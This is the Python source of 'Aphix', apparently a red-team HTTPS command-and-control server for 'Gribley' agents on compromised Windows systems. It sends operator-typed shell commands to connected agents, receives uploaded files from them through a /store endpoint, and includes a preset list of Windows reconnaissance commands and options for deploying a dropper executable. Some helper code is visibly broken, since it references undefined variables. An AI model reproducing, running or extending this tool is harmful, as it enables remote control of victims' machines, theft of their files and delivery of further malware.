# Authored by: Brent 'becrevex' Chambers
# Date: 03/22/2020
# Vendor Homepage: https://www.cygienesolutions.com/
# Filename: aphix_server.py
#
# Description:
# Aphix is an HTTPS C2 server which can establish remote control over Gribley client connected agents.

import sys
import ssl
import os, cgi
import argparse
import http.server
import http.server
from socket import gethostname, gethostbyname
from requests import get
from os import system

sys_enum_commands = ["systeminfo\n",
                    "hostname\n",
                    "net users\n",
                    "ipconfig /all\n",
                    "route print\n",
                    "arp -A\n",
                    "netstat -ano\n",
                    "netsh firewall show state\n",
                    "netsh firewall show config\n",
                    "schtasks /query /fo LIST /v\n",
                    "tasklist /SVC\n",
                    "net start\n"]


help_example = "EXAMPLE: aphix_server.py -enumerate -deploy [file.exe] -port 344 "
parser = argparse.ArgumentParser(description='Aphix Server: C2 CLI Server w/ SSL/HTTP Comms.'+'\n\n'+help_example, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-p', '--port')
parser.add_argument('-enumerate', action='store_true', help='Perform enumeration procedures on Gribley compromised systems.')
parser.add_argument('-deploy', action='store_true', help='Deploy specified dropper to Gribley compromised systems.')
args = parser.parse_args()


PORT_NUMBER = 443
HOST_NAME = ''
ENUMERATE = False
DEPLOY = False
PERSIST = False
INFECT = False
HARVEST = False

# The first argument passed to aphix is the port number.  
def setPortNumber(portnum):
     PORT_NUMBER = portnum

def cert_help():
        helpfile =  """
#Steps to generate self-signed cert
Step 1: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
Step 2: openssl x509 -text -noout -in certificate.pem
Step 3: openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12
Step 4: openssl pkcs12 -in certificate.p12 -noout -info
        """
        print(helpfile)


class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        dir(self)
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_GET_old(self):
        global count
        dir(self)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        if ENUMERATE:
                if count < len(sys_enum_commands):
                        self.wfile.write(sys_enum_commands[count].encode())
                        time.sleep(.3)
                        count += 1
        sys.wfile.write(command.encode())


    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-]Unexpected POST request')
                fs_up = fs['file']
                with open('./place_holder.txt', 'wb') as o:
                    print('[+] Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())



if __name__ == '__main__':
    start_status = ""
    if args.port:
        srvport = args.port.split('-')[0]            
        setPortNumber(srvport)
        PORT_NUMBER = int(srvport)
    elif args.enumerate:
        ENUMERATE = True
    elif args.deploy:
        DEPLOY = True



    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    pub_ip = get('https://api.ipify.org').text
    lan_ip = gethostbyname(gethostname())

    try:
        httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="./key.pem", certfile="./certificate.pem", server_side=True)
    except:
        print('Self-signed certificate files missing. Refer to README.md')
        print('Rerun the server.')
        cert_help()
        sys.exit()
    try:
        print('[+] Starting Aphix C2 Server 0.0.0.0: ' + str(PORT_NUMBER))
        print('   lan: https:\\\\'+lan_ip+":"+str(PORT_NUMBER))
        print('   wan: https:\\\\'+pub_ip+":"+str(PORT_NUMBER))
        print()
        print('[+] Server started with the following activated modules: ')
        if ENUMERATE:
                print("   [!] Enumeration/Interrogation engaged for incoming agent.")
        elif DEPLOY:
                print("   [!] Dropper deployment engaged for incoming agents.")
        print("\nServer started....")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
